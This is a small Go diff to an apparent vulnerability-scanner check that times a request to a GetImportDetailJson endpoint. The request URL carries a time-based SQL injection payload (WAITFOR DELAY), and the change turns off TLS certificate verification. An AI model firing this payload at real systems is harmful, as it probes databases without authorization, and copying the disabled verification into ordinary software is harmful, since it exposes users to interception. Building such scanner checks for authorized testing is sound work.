@@ -1,6 +1,7 @@
 package vulList
 
 import (
+	"crypto/tls"
 	"fmt"
 	"github.com/fatih/color"
 	"net/http"
@@ -11,6 +12,9 @@ func GetImportDetailJsonCheck(target string) error {
 	baseurl := target + "BaseModule/ExcelImport/GetImportDetailJson?ImportId=1%27%3bWAITFOR+DELAY+%270%3a0%3a5%27--&IsShow=1"
 	client := &http.Client{
 		Timeout: 10 * time.Second, //超时
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 禁用证书验证
+		},
 	}
 
 	startTime := time.Now()
